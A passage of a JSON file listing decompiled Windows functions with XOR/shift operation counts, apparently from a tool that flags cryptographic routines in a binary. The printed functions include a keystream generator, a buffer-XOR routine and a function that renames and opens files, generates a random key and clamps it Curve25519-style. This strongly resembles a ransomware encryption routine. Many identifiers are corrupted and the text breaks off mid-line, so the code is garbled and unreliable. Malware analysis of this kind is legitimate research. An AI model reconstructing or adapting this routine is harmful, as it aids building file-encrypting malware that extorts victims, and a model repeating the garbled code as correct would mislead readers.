v142[10] = v128 + __CFADD__(v136, (_DWORD)v97) + HIF26AD(v97);\n        v142[13] = v138 + v91;\n        v142[12] = v140 + __CFADD__(v138, (_DWORD)v91) + v89;\n        v142[15] = v139 + v103;\n        v142[14] = v141 + __CFADD__(v139, v103) + v121;\n        v142[48] = 0;\n      }\n      while ( (int)v5 > 127 );\n    }\n    result = memcpy(v6, (const void *)v5, (size_t)v6);\n  }\n  a4[48] = v5;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14FF03600",
        "Total XOR and shift operations": 17,
        "XOR operations": 17,
        "Shift operations": 0,
        "Operation percentage": "34.00%",
        "Function Body": "\n__int64 __fastcall sub_14FF03600(__int64 a1, __int64 a2, _DWORD *a3, _DWORD *a4, int *a5, unsigned int a6)\n{\n  unsigned int v6; // ebx\n  __int64 result; // rax\n  __int64 i; // rcx\n  int v12[26]; // [rsp+20h] [rbp-68h] BYREF\n\n  v6 = a6;\n  if ( a6 >= 0x40 )\n  {\n    do\n    {\n      sub_14DB6CBC9((__int64)a3, (__int64)a5, v12, a4);\n      *a5 = *a3 ^ v12[0];\n      a5[1] = a3[1] ^ v12[1];\n      a5[2] = a3[2] ^ v12[2];\n      a5[3] = a3[3] ^ v12[3];\n      a5[4] = a3[4] ^ v12[4];\n      a5[5] = a3[5] ^ v12[5];\n      a5[6] = a3[6] ^ v12[6];\n      a5[7] = a3[7] ^ v12[7];\n      a5[8] = a3[8] ^ v12[8];\n      a5[9] = a3[9] ^ v12[9];\n      a5[10] = a3[10] ^ v12[10];\n      a5[11] = a3[11] ^ v12[11];\n      a5[12] = a3[12] ^ v12[12];\n      a5[13] = a3[13] ^ v12[13];\n      a5[14] = a3[14] ^ v12[14];\n      result = (unsigned int)(a3[15] ^ v12[15]);\n      a5[15] = result;\n      v6 -= 64;\n      a3 += 16;\n      a5 += 16;\n    }\n    while ( v6 > 0x3F );\n  }\n  if ( v6 )\n  {\n    sub_14DB6CBC9((__int64)a3, (__int64)a5, v12, a4);\n    result = v6;\n    for ( i = 0LL; i != v6; ++i )\n      *((_BYTE *)a5 + i) = *((_BYTE *)a3 + i) ^ *((_BYTE *)v12 + i);\n  }\n  return result;\n}\n\n// nfuncs=255 queued=140 decompiled=140 lumina nreq=0 worse=0 better=0\n// ALL OK, 140 function(s) have been successfully decompiled\n"
    },
    {
        "Function": "sub_14DB6CBC9",
        "Total XOR and shift operations": 95,
        "XOR operations": 63,
        "Shift operations": 32,
        "Operation percentage": "31.25%",
        "Function Body": "\nint *__fastcall sub_14DB6CBC9(__int64 a1, __int64 a2, int *a3, _DWORD *a4)\n{\n  unsigned int v4; // eax\n  __int64 v5; // r14\n  unsigned int v6; // r8d\n  int v7; // edi\n  int *result; // rax\n  int v9; // esi\n  int v10; // ebx\n  int v11; // edi\n  int v12; // ebx\n  int v13; // esi\n  int v14; // edi\n  int v15; // esi\n  int v16; // ebx\n  int v17; // edi\n  int v18; // edi\n  int v19; // esi\n  int v20; // ebx\n  int v21; // edi\n  int v22; // edi\n  int v23; // esi\n  int v24; // ebx\n  int v25; // edi\n  int v26; // edi\n  int v27; // esi\n  int v28; // ebx\n  int v29; // esi\n  int v30; // ebx\n  int v31; // edi\n  int v32; // ebx\n  int v33; // edi\n  int v34; // ebx\n  int v35; // edi\n  int v36; // ebx\n  int v37; // edi\n  int v38; // esi\n  int v39; // edi\n  int v40; // esi\n  __int64 v41; // r14\n  int v42; // ebp\n  int v43; // esi\n  int v44; // edi\n  int v45; // esi\n  int v46; // ebx\n  int v47; // edi\n  int v48; // ebp\n  int v49; // esi\n  int v50; // edi\n  int v51; // edi\n  int v52; // ebp\n  int v53; // esi\n  int v54; // edi\n  int v55; // edi\n  int v56; // ebp\n  int v57; // esi\n  int v58; // edi\n  int v59; // edi\n  int v60; // ebx\n  int v61; // esi\n  int v62; // ebx\n  int v63; // esi\n  int v64; // ebp\n  int v65; // esi\n  int v66; // edi\n  int v67; // esi\n  int v68; // ebp\n  int v69; // esi\n  int v70; // edi\n  int v71; // ebx\n\n  v4 = a4[1056];\n  v5 = v4 & 0x1FF;\n  v6 = (v4 + 16) & 0x1FF;\n  a4[1056] = (v4 + 16) & 0x3FF;\n  if ( v4 > 0x1FF )\n  {\n    v40 = a4[(unsigned __int8)a4[1044]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1044] >> 14) & 0x3FC) + 1024);\n    v41 = (unsigned int)v5 | 0x200;\n    result = &a4[v41 + 15];\n    v42 = a4[v41] + (__ROL4__(a4[v41 + 1], 23) ^ __ROL4__(a4[1053], 10)) + __ROL4__(a4[1046], 8);\n    *(result - 15) = v42;\n    a4[1040] = v42;\n    *a3 = a4[v41] ^ v40;\n    v43 = a4[(unsigned __int8)a4[1045]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1045] >> 14) & 0x3FC) + 1024);\n    v44 = a4[v41 + 1] + (__ROL4__(a4[v41 + 2], 23) ^ __ROL4__(a4[1054], 10)) + __ROL4__(a4[1047], 8);\n    *(result - 14) = v44;\n    a4[1041] = v44;\n    a3[1] = a4[v41 + 1] ^ v43;\n    v45 = a4[(unsigned __int8)a4[1046]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1046] >> 14) & 0x3FC) + 1024);\n    v46 = a4[v41 + 2] + (__ROL4__(a4[v41 + 3], 23) ^ __ROL4__(a4[1055], 10)) + __ROL4__(a4[1048], 8);\n    *(result - 13) = v46;\n    a4[1042] = v46;\n    a3[2] = a4[v41 + 2] ^ v45;\n    v47 = a4[(unsigned __int8)a4[1047]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1047] >> 14) & 0x3FC) + 1024);\n    v48 = a4[v41 + 3] + (__ROL4__(a4[v41 + 4], 23) ^ __ROL4__(a4[1040], 10)) + __ROL4__(a4[1049], 8);\n    *(result - 12) = v48;\n    a4[1043] = v48;\n    a3[3] = a4[v41 + 3] ^ v47;\n    v49 = a4[(unsigned __int8)a4[1048]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1048] >> 14) & 0x3FC) + 1024);\n    v50 = a4[v41 + 4] + (__ROL4__(a4[v41 + 5], 23) ^ __ROL4__(a4[1041], 10)) + __ROL4__(a4[1050], 8);\n    *(result - 11) = v50;\n    a4[1044] = v50;\n    a3[4] = a4[v41 + 4] ^ v49;\n    v51 = a4[(unsigned __int8)a4[1049]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1049] >> 14) & 0x3FC) + 1024);\n    v52 = a4[v41 + 5] + (__ROL4__(a4[v41 + 6], 23) ^ __ROL4__(a4[1042], 10)) + __ROL4__(a4[1051], 8);\n    *(result - 10) = v52;\n    a4[1045] = v52;\n    a3[5] = a4[v41 + 5] ^ v51;\n    v53 = a4[(unsigned __int8)a4[1050]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1050] >> 14) & 0x3FC) + 1024);\n    v54 = a4[v41 + 6] + (__ROL4__(a4[v41 + 7], 23) ^ __ROL4__(a4[1043], 10)) + __ROL4__(a4[1052], 8);\n    *(result - 9) = v54;\n    a4[1046] = v54;\n    a3[6] = a4[v41 + 6] ^ v53;\n    v55 = a4[(unsigned __int8)a4[1051]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1051] >> 14) & 0x3FC) + 1024);\n    v56 = a4[v41 + 7] + (__ROL4__(a4[v41 + 8], 23) ^ __ROL4__(a4[1044], 10)) + __ROL4__(a4[1053], 8);\n    *(result - 8) = v56;\n    a4[1047] = v56;\n    a3[7] = a4[v41 + 7] ^ v55;\n    v57 = a4[(unsigned __int8)a4[1052]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1052] >> 14) & 0x3FC) + 1024);\n    v58 = a4[v41 + 8] + (__ROL4__(a4[v41 + 9], 23) ^ __ROL4__(a4[1045], 10)) + __ROL4__(a4[1054], 8);\n    *(result - 7) = v58;\n    a4[1048] = v58;\n    a3[8] = a4[v41 + 8] ^ v57;\n    v59 = a4[(unsigned __int8)a4[1053]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1053] >> 14) & 0x3FC) + 1024);\n    v60 = a4[v41 + 9] + (__ROL4__(a4[v41 + 10], 23) ^ __ROL4__(a4[1046], 10)) + __ROL4__(a4[1055], 8);\n    *(result - 6) = v60;\n    a4[1049] = v60;\n    a3[9] = a4[v41 + 9] ^ v59;\n    v61 = a4[(unsigned __int8)a4[1054]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1054] >> 14) & 0x3FC) + 1024);\n    v62 = a4[v41 + 10] + (__ROL4__(a4[v41 + 11], 23) ^ __ROL4__(a4[1047], 10)) + __ROL4__(a4[1040], 8);\n    *(result - 5) = v62;\n    a4[1050] = v62;\n    a3[10] = a4[v41 + 10] ^ v61;\n    v63 = a4[(unsigned __int8)a4[1055]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1055] >> 14) & 0x3FC) + 1024);\n    v64 = a4[v41 + 11] + (__ROL4__(a4[v41 + 12], 23) ^ __ROL4__(a4[1048], 10)) + __ROL4__(a4[1041], 8);\n    *(result - 4) = v64;\n    a4[1051] = v64;\n    a3[11] = a4[v41 + 11] ^ v63;\n    v65 = a4[(unsigned __int8)a4[1040]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1040] >> 14) & 0x3FC) + 1024);\n    v66 = a4[v41 + 12] + (__ROL4__(a4[v41 + 13], 23) ^ __ROL4__(a4[1049], 10)) + __ROL4__(a4[1042], 8);\n    *(result - 3) = v66;\n    a4[1052] = v66;\n    a3[12] = a4[v41 + 12] ^ v65;\n    v67 = a4[(unsigned __int8)a4[1041]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1041] >> 14) & 0x3FC) + 1024);\n    v68 = a4[v41 + 13] + (__ROL4__(a4[v41 + 14], 23) ^ __ROL4__(a4[1050], 10)) + __ROL4__(a4[1043], 8);\n    *(result - 2) = v68;\n    a4[1053] = v68;\n    a3[13] = a4[v41 + 13] ^ v67;\n    v69 = a4[(unsigned __int8)a4[1042]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1042] >> 14) & 0x3FC) + 1024);\n    v70 = a4[v41 + 14] + (__ROL4__(*result, 23) ^ __ROL4__(a4[1051], 10)) + __ROL4__(a4[1044], 8);\n    *(result - 1) = v70;\n    a4[1054] = v70;\n    a3[14] = a4[v41 + 14] ^ v69;\n    v38 = a4[(unsigned __int8)a4[1043]]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1043] >> 14) & 0x3FC) + 1024);\n    v71 = *result + (__ROL4__(a4[v6 | 0x200], 23) ^ __ROL4__(a4[1052], 10)) + __ROL4__(a4[1045], 8);\n    *result = v71;\n    a4[1055] = v71;\n  }\n  else\n  {\n    v7 = a4[(unsigned __int8)a4[1028] + 512]\n       + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1028] >> 14) & 0x3FC) + 3072);\n    result = &a4[(v4 & 0x1FF) + 15];\n    v9 = a4[(unsigned int)v5] + (__ROL4__(a4[v5 + 1], 9) ^ __ROL4__(a4[1037], 22)) + __ROL4__(a4[1030], 24);\n    *(result - 15) = v9;\n    a4[1024] = v9;\n    *a3 = a4[(unsigned int)v5] ^ v7;\n    v10 = a4[(unsigned __int8)a4[1029] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1029] >> 14) & 0x3FC) + 3072);\n    v11 = a4[v5 + 1] + (__ROL4__(a4[(unsigned int)v5 + 2], 9) ^ __ROL4__(a4[1038], 22)) + __ROL4__(a4[1031], 24);\n    a4[v5 + 1] = v11;\n    a4[1025] = v11;\n    a3[1] = a4[v5 + 1] ^ v10;\n    v12 = a4[(unsigned __int8)a4[1030] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1030] >> 14) & 0x3FC) + 3072);\n    v13 = a4[(unsigned int)v5 + 2]\n        + (__ROL4__(a4[(unsigned int)v5 + 3], 9) ^ __ROL4__(a4[1039], 22))\n        + __ROL4__(a4[1032], 24);\n    *(result - 13) = v13;\n    a4[1026] = v13;\n    a3[2] = a4[(unsigned int)v5 + 2] ^ v12;\n    v14 = a4[(unsigned __int8)a4[1031] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1031] >> 14) & 0x3FC) + 3072);\n    v15 = a4[(unsigned int)v5 + 3]\n        + (__ROL4__(a4[(unsigned int)v5 + 4], 9) ^ __ROL4__(a4[1024], 22))\n        + __ROL4__(a4[1033], 24);\n    *(result - 12) = v15;\n    a4[1027] = v15;\n    a3[3] = a4[(unsigned int)v5 + 3] ^ v14;\n    v16 = a4[(unsigned __int8)a4[1032] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1032] >> 14) & 0x3FC) + 3072);\n    v17 = a4[(unsigned int)v5 + 4]\n        + (__ROL4__(a4[(unsigned int)v5 + 5], 9) ^ __ROL4__(a4[1025], 22))\n        + __ROL4__(a4[1034], 24);\n    *(result - 11) = v17;\n    a4[1028] = v17;\n    a3[4] = a4[(unsigned int)v5 + 4] ^ v16;\n    v18 = a4[(unsigned __int8)a4[1033] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1033] >> 14) & 0x3FC) + 3072);\n    v19 = a4[(unsigned int)v5 + 5]\n        + (__ROL4__(a4[(unsigned int)v5 + 6], 9) ^ __ROL4__(a4[1026], 22))\n        + __ROL4__(a4[1035], 24);\n    *(result - 10) = v19;\n    a4[1029] = v19;\n    a3[5] = a4[(unsigned int)v5 + 5] ^ v18;\n    v20 = a4[(unsigned __int8)a4[1034] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1034] >> 14) & 0x3FC) + 3072);\n    v21 = a4[(unsigned int)v5 + 6]\n        + (__ROL4__(a4[(unsigned int)v5 + 7], 9) ^ __ROL4__(a4[1027], 22))\n        + __ROL4__(a4[1036], 24);\n    *(result - 9) = v21;\n    a4[1030] = v21;\n    a3[6] = a4[(unsigned int)v5 + 6] ^ v20;\n    v22 = a4[(unsigned __int8)a4[1035] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1035] >> 14) & 0x3FC) + 3072);\n    v23 = a4[(unsigned int)v5 + 7]\n        + (__ROL4__(a4[(unsigned int)v5 + 8], 9) ^ __ROL4__(a4[1028], 22))\n        + __ROL4__(a4[1037], 24);\n    *(result - 8) = v23;\n    a4[1031] = v23;\n    a3[7] = a4[(unsigned int)v5 + 7] ^ v22;\n    v24 = a4[(unsigned __int8)a4[1036] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1036] >> 14) & 0x3FC) + 3072);\n    v25 = a4[(unsigned int)v5 + 8]\n        + (__ROL4__(a4[(unsigned int)v5 + 9], 9) ^ __ROL4__(a4[1029], 22))\n        + __ROL4__(a4[1038], 24);\n    *(result - 7) = v25;\n    a4[1032] = v25;\n    a3[8] = a4[(unsigned int)v5 + 8] ^ v24;\n    v26 = a4[(unsigned __int8)a4[1037] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1037] >> 14) & 0x3FC) + 3072);\n    v27 = a4[(unsigned int)v5 + 9]\n        + (__ROL4__(a4[(unsigned int)v5 + 10], 9) ^ __ROL4__(a4[1030], 22))\n        + __ROL4__(a4[1039], 24);\n    *(result - 6) = v27;\n    a4[1033] = v27;\n    a3[9] = a4[(unsigned int)v5 + 9] ^ v26;\n    v28 = a4[(unsigned __int8)a4[1038] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1038] >> 14) & 0x3FC) + 3072);\n    v29 = a4[(unsigned int)v5 + 10]\n        + (__ROL4__(a4[(unsigned int)v5 + 11], 9) ^ __ROL4__(a4[1031], 22))\n        + __ROL4__(a4[1024], 24);\n    *(result - 5) = v29;\n    a4[1034] = v29;\n    a3[10] = a4[(unsigned int)v5 + 10] ^ v28;\n    v30 = a4[(unsigned __int8)a4[1039] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1039] >> 14) & 0x3FC) + 3072);\n    v31 = a4[(unsigned int)v5 + 11]\n        + (__ROL4__(a4[(unsigned int)v5 + 12], 9) ^ __ROL4__(a4[1032], 22))\n        + __ROL4__(a4[1025], 24);\n    *(result - 4) = v31;\n    a4[1035] = v31;\n    a3[11] = a4[(unsigned int)v5 + 11] ^ v30;\n    v32 = a4[(unsigned __int8)a4[1024] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1024] >> 14) & 0x3FC) + 3072);\n    v33 = a4[(unsigned int)v5 + 12]\n        + (__ROL4__(a4[(unsigned int)v5 + 13], 9) ^ __ROL4__(a4[1033], 22))\n        + __ROL4__(a4[1026], 24);\n    *(result - 3) = v33;\n    a4[1036] = v33;\n    a3[12] = a4[(unsigned int)v5 + 12] ^ v32;\n    v34 = a4[(unsigned __int8)a4[1025] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1025] >> 14) & 0x3FC) + 3072);\n    v35 = a4[(unsigned int)v5 + 13]\n        + (__ROL4__(a4[(unsigned int)v5 + 14], 9) ^ __ROL4__(a4[1034], 22))\n        + __ROL4__(a4[1027], 24);\n    *(result - 2) = v35;\n    a4[1037] = v35;\n    a3[13] = a4[(unsigned int)v5 + 13] ^ v34;\n    v36 = a4[(unsigned __int8)a4[1026] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1026] >> 14) & 0x3FC) + 3072);\n    v37 = a4[(unsigned int)v5 + 14] + (__ROL4__(*result, 9) ^ __ROL4__(a4[1035], 22)) + __ROL4__(a4[1028], 24);\n    *(result - 1) = v37;\n    a4[1038] = v37;\n    a3[14] = a4[(unsigned int)v5 + 14] ^ v36;\n    v38 = a4[(unsigned __int8)a4[1027] + 512]\n        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1027] >> 14) & 0x3FC) + 3072);\n    v39 = *result + (__ROL4__(a4[v6], 9) ^ __ROL4__(a4[1036], 22)) + __ROL4__(a4[1029], 24);\n    *result = v39;\n    a4[1039] = v39;\n  }\n  a3[15] = *result ^ v38;\n  return result;\n}\n\n"
    },
    {
        "Function": "Z17_e3cc5b58c71c8439Pw",
        "Total XOR and shift operations": 115,
        "XOR operations": 74,
        "Shift operations": 41,
        "Operation percentage": "20.50%",
        "Function Body": "\n// positive sp value has been detected, the output may be wrong!\nint __fastcall Z17_e3cc5b58c71c8439Pw(\n        double a1,\n        double a2,\n        double a3,\n        double a4,\n        double a5,\n        double a6,\n        __m128 a7,\n        __int64 a8,\n        __int64 a9,\n        __int64 a10,\n        const WCHAR *a11)\n{\n  unsigned __int64 v11; // rdi\n  __m128i si128; // xmm0\n  int v13; // eax\n  __int64 v14; // rdx\n  const WCHAR *v15; // rax\n  WCHAR *v16; // rsi\n  DWORD *FileW; // r15\n  __int64 v18; // rdx\n  int *v19; // rax\n  int *v20; // r12\n  double v21; // xmm4_8\n  double v22; // xmm5_8\n  double v23; // xmm4_8\n  double v24; // xmm5_8\n  __int64 i; // rax\n  __int64 v26; // rcx\n  int v27; // eax\n  int v28; // edx\n  unsigned __int64 v29; // rt0\n  __int64 v30; // rsi\n  char *v31; // rax\n  __int64 v32; // rcx\n  __int64 j; // rax\n  __int32 v35; // ebx\n  __int32 v36; // ecx\n  unsigned __int64 k; // rax\n  int v38; // ecx\n  __int64 m; // rax\n  unsigned int v40; // r8d\n  __int64 n; // rax\n  __int64 v42; // rax\n  __int32 v43; // ecx\n  unsigned __int32 v44; // r8d\n  LARGE_INAD06R v45; // rsi\n  __int64 ii; // rax\n  __int64 jj; // rax\n  int v48; // r11d\n  unsigned int v49; // ecx\n  int v50; // r10d\n  __int32 v51; // esi\n  __int32 v52; // esi\n  __int32 v53; // esi\n  __int32 v54; // eax\n  int v55; // eax\n  int v56; // eax\n  int v57; // eax\n  int v58; // eax\n  int v59; // eax\n  int v60; // eax\n  int v61; // edx\n  int v62; // edx\n  int v63; // esi\n  int v64; // esi\n  int v65; // ebp\n  __int32 v66; // edx\n  __int32 v67; // edx\n  __int32 v68; // edx\n  __int32 v69; // eax\n  __int32 v70; // eax\n  __int32 v71; // eax\n  __int32 v72; // eax\n  __int32 v73; // edx\n  __int32 v74; // edx\n  __int32 v75; // edx\n  __int32 v76; // eax\n  __int32 v77; // eax\n  __int32 v78; // edx\n  __int32 v79; // edx\n  __int32 v80; // edx\n  __int32 v81; // edx\n  unsigned int v82; // eax\n  __int64 v83; // rcx\n  unsigned __int64 v84; // rbx\n  __int64 v85; // r14\n  __int64 v86; // rbp\n  LARGE_INAD06R *v87; // rbx\n  HA2419 v89; // [rsp+0h] [rbp-12D8h] BYREF\n  __int64 v90; // [rsp+20h] [rbp-12B8h]\n  int v91; // [rsp+28h] [rbp-12B0h]\n  __int64 v92; // [rsp+30h] [rbp-12A8h]\n  unsigned int v93[6]; // [rsp+40h] [rbp-1298h] BYREF\n  __int64 v94; // [rsp+58h] [rbp-1280h]\n  _OWORD v95[4]; // [rsp+60h] [rbp-1278h]\n  _DWORD v96[32]; // [rsp+A0h] [rbp-1238h] BYREF\n  __int128 v97; // [rsp+120h] [rbp-11B8h] BYREF\n  __int128 v98; // [rsp+130h] [rbp-11A8h]\n  __m128i v99[12]; // [rsp+140h] [rbp-1198h] BYREF\n  __int128 v100; // [rsp+150h] [rbp-1188h]\n  __int128 v101; // [rsp+160h] [rbp-1178h]\n  _OWORD v102[9]; // [rsp+170h] [rbp-1168h]\n  int v103; // [rsp+200h] [rbp-10D8h]\n  _OWORD v104[243]; // [rsp+204h] [rbp-10D4h] BYREF\n  unsigned int v105; // [rsp+1140h] [rbp-198h]\n  unsigned int v106; // [rsp+1144h] [rbp-194h]\n  unsigned int v107; // [rsp+1148h] [rbp-190h]\n  unsigned int v108; // [rsp+114Ch] [rbp-18Ch]\n  unsigned int v109; // [rsp+1150h] [rbp-188h]\n  unsigned int v110; // [rsp+1154h] [rbp-184h]\n  unsigned int v111; // [rsp+1158h] [rbp-180h]\n  unsigned int v112; // [rsp+115Ch] [rbp-17Ch]\n  unsigned int v113; // [rsp+1160h] [rbp-178h]\n  unsigned int v114; // [rsp+1164h] [rbp-174h]\n  unsigned int v115; // [rsp+1168h] [rbp-170h]\n  unsigned int v116; // [rsp+116Ch] [rbp-16Ch]\n  unsigned int v117; // [rsp+1170h] [rbp-168h]\n  unsigned int v118; // [rsp+1174h] [rbp-164h]\n  unsigned int LowPart; // [rsp+1178h] [rbp-160h]\n  unsigned int v120; // [rsp+117Ch] [rbp-15Ch]\n  unsigned int v121; // [rsp+1180h] [rbp-158h]\n  unsigned int v122; // [rsp+1184h] [rbp-154h]\n  unsigned int v123; // [rsp+1188h] [rbp-150h]\n  unsigned int v124; // [rsp+118Ch] [rbp-14Ch]\n  unsigned int v125; // [rsp+1190h] [rbp-148h]\n  unsigned int v126; // [rsp+1194h] [rbp-144h]\n  unsigned int v127; // [rsp+1198h] [rbp-140h]\n  unsigned int v128; // [rsp+119Ch] [rbp-13Ch]\n  unsigned int v129; // [rsp+11A0h] [rbp-138h]\n  unsigned int v130; // [rsp+11A4h] [rbp-134h]\n  unsigned int v131; // [rsp+11A8h] [rbp-130h]\n  unsigned int v132; // [rsp+11ACh] [rbp-12Ch]\n  unsigned int v133; // [rsp+11B0h] [rbp-128h]\n  unsigned int v134; // [rsp+11B4h] [rbp-124h]\n  unsigned int v135; // [rsp+11B8h] [rbp-120h]\n  unsigned int v136; // [rsp+11BCh] [rbp-11Ch]\n  int v137; // [rsp+11C0h] [rbp-118h]\n  __m128i v138; // [rsp+11C4h] [rbp-114h] BYREF\n  __int128 v139; // [rsp+11D4h] [rbp-104h]\n  _OWORD v140[2]; // [rsp+11E4h] [rbp-F4h]\n  __int64 v141; // [rsp+1204h] [rbp-D4h]\n  _WORD v142[16]; // [rsp+1210h] [rbp-C8h] BYREF\n  unsigned int v143; // [rsp+1230h] [rbp-A8h]\n  __int128 v144; // [rsp+1238h] [rbp-A0h]\n  __m128i v145; // [rsp+1248h] [rbp-90h]\n  _WORD v146[16]; // [rsp+1258h] [rbp-80h] BYREF\n  __m128i v147; // [rsp+1278h] [rbp-60h] BYREF\n  char v148; // [rsp+1297h] [rbp-41h]\n\n  v11 = (unsigned __int64)a11;\n  v98 = xmmword_14EC6E440;\n  v97 = xmmword_14EC6E430;\n  v144 = xmmword_14EC6E3A0;\n  si128 = _mm_load_si128((const __m128i *)&xmmword_14EC6E3B0);\n  v145 = si128;\n  SetFileAttributesW(a11, a9);\n  v13 = lstrlenW((LP0477R)v11);\n  v15 = (const WCHAR *)sub_1445C278B(v11, a9, v14, 2 * v13 + 14);\n  if ( v15 )\n  {\n    v16 = (WCHAR *)v15;\n    lstrcpyW((LP595E)v11, v15);\n    lstrcatW((LP595E)v11, v16);\n    LO4700D(v15) = MoveFileExW((LP0477R)v11, v16, (DWORD)v16);\n    if ( (_DWORD)v15 )\n    {\n      v92 = 0LL;\n      v91 = 0x80E8F80;\n      LO4700D(v90) = 3;\n      FileW = (DWORD *)CreateFileW((LP0477R)v11, (DWORD)v16, 0xC0584F00, (LP8360RITY_AT452CUTES)v16, 0, 0, v89);\n      GetProcessHeap();\n      LO4700D(v15) = HeapFree((HA2419)v11, (DWORD)v16, 0LL);\n      if ( FileW != (DWORD *)-1LL )\n      {\n        GetFileSizeEx((HA2419)v11, (PLAB2E_INAD06R)v16);\n        v19 = (int *)sub_1445C278B(v11, (__int64)v16, v18, 0x10F053);\n        if ( v19 )\n        {\n          v20 = v19;\n          CryptGenRandom(v11, (DWORD)&v147, (BYTE *)0x20);\n          v147.m128i_i8[0] &= 0xF8u;\n          v148 = v148 & 0x3F | 0x40;\n          sub_1414500C7(\n            *(double *)si128.m128i_i64,\n            a2,\n            a3,\n            a4,\n            v21,\n            v22,\n            a7,\n            v11,\n            (__int64)&v147,\n            &v147,\n            v142,\n            (unsigned __int16 *)&v97);\n          sub_1414500C7(\n            *(double *)si128.m128i_i64,\n            a2,\n            a3,\n            a4,\n            v23,\n            v24,\n            a7,\n            v11,\n            (__int64)&v147,\n            &v147,\n            v146,\n            word_14D2D70A0);\n          for ( i = 0LL; i != 4; ++i )\n            v99[i] = _mm_load_si128((const __m128i *)((char *)&SH74C8_Constants_1418E2420 + i * 16));\n          v103 = 0;\n          v104[0] = 0LL;\n          sub_14945B3C1(42DF1E72084F, (__int64)v99, (char *)v146, v99, 0x20u);\n          v26 = 0LL;\n          v27 = v103;\n          do\n          {\n            v28 = 0;\n            if ( (unsigned __int64)(v26 + 4) >= 2 )\n              v28 = *((_DWORD *)v104 + (unsigned int)(v26 - 4 + 6));\n            HIF26AD(v29) = *((_DWORD *)v104 + v26 + 3);\n            LO4700D(v29) = v28;\n            v93[v26-- + 3] = v29 >> 29;\n          }\n          while ( v26 != -4 );\n          v30 = ((v27 > 111) << 7) - v27 + 112;\n          LO1019(v96[0]) = 0x80;\n          sub_14945B3C1(42DF1E72084F, v30, (char *)v96, v99, v30);\n          v31 = (char *)v96 + 3;\n          v32 = 3LL;\n          do\n          {\n            *(_DWORD *)(v31 - 3) = _byteswap_ulong(v93[v32]);\n            v31 += 4;\n          }\n          while ( v32-- != 0 );\n          sub_14945B3C1(42DF1E72084F, v30, (char *)v96, v99, 0x10u);\n          for ( j = 0LL; j != 8; ++j )\n          {\n            v35 = v99[0].m128i_i32[2 * j];\n            v36 = v99[0].m128i_i32[2 * j + 1];\n            *((_BYTE *)v95 + 8 * j) = HIE30D(v35);\n            *((_BYTE *)v95 + 8 * j + 1) = BYTE2(v35);\n            *((_BYTE *)v95 + 8 * j + 2) = BYTE1(v35);\n            *((_BYTE *)v95 + 8 * j + 3) = v35;\n            *((_BYTE *)v95 + 8 * j + 4) = HIE30D(v36);\n            *((_BYTE *)v95 + 8 * j + 5) = BYTE2(v36);\n            *((_BYTE *)v95 + 8 * j + 6) = BYTE1(v36);\n            *((_BYTE *)v95 + 8 * j + 7) = v36;\n          }\n          v141 = 0x10F053003C5FL;\n          v138 = (__m128i)v95[0];\n          v139 = v95[1];\n          k = 0LL;\n          do\n          {\n            *((_DWORD *)v140 + k) = *((_DWORD *)&v95[2] + k);\n            ++k;\n          }\n          while ( k < (unsigned __int64)HIF26AD(v141) >> 5 );\n          if ( (unsigned int)k <= 7 )\n          {\n            for ( k = (unsigned int)k; k != 8; ++k )\n              *((_DWORD *)v140 + k) = *((_DWORD *)v140 + (unsigned int)(k - 4));\n          }\n          v99[0] = _mm_loadu_si128(&v138);\n          v100 = v139;\n          v101 = v140[0];\n          v102[0] = v140[1];\n          v38 = _mm_cvtsi128_si32(v99[0]);\n          for ( m = 16LL; m != 272; ++m )\n          {\n            v40 = v96[m + 25];\n            v99[0].m128i_i32[m] = m\n                                + (__ROL4__(v40, 25) ^ __ROL4__(v40, 14) ^ (v40 >> 3))\n                                + (__ROL4__(*((_DWORD *)&v98 + m + 2), 15) ^ __ROL4__(*((_DWORD *)&v98 + m + 2), 13) ^ (*((_DWORD *)&v98 + m + 2) >> 10))\n                                + *((_DWORD *)&v97 + m + 1)\n                                + v38;\n            v38 = v40;\n          }\n          for ( n = 0LL; n != 